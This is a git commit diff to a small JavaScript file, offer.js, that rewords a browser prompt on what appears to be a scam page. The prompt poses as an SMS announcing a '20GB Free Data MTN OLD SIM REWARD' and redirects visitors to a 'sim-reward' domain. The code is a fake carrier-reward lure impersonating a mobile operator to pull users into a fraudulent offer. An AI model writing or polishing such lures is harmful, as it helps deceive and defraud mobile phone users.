72ec2c00112672cbb12222e622e332883faa8c29
codexken <inyeneawakessien@gmail.com>
2024-08-23 10:59:39 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '20GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE ','20GB Free Data');
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE ','20GB Free Data');
 if (password != '20GB Free Data') {
 location.href='https://sim-reward.4g-data.info/15GB';
 }
